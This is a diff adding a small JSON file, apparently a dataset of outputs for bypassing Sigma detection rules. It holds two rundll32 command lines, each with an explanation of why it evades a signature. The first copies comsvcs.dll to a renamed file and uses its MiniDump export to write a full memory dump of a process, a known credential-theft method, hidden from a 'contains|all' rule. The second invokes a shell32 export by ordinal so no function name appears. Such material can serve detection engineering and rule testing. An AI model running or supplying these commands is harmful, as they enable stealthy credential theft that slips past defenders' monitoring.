@@ -1,0 +1,10 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\comsvcs.dll C:\\Temp\\backup.dll && rundll32.exe C:\\Temp\\backup.dll,MiniDump 1000 C:\\Temp\\dump.bin full",
+    "explanation": "The Sigma rule relies on a 'contains|all' condition looking for both the DLL name ('comsvcs.dll') and the function name ('MiniDump') within the same command line string. By copying the DLL to a new location with a different name and executing the renamed file, the string 'comsvcs.dll' is omitted from the execution parameters, effectively bypassing the signature while maintaining functionality."
+  },
+  {
+    "output": "rundll32.exe shell32.dll,#250",
+    "explanation": "The rule explicitly searches for known text strings of exported functions, such as 'Control_RunDLL'. Windows architecture allows calling exported functions by their Ordinal numbers instead of their text names. By executing the ordinal (e.g., #250 for Control_RunDLL, depending on the exact Windows build), the function name string is entirely absent from the command line, evading the detection logic."
+  }
+]
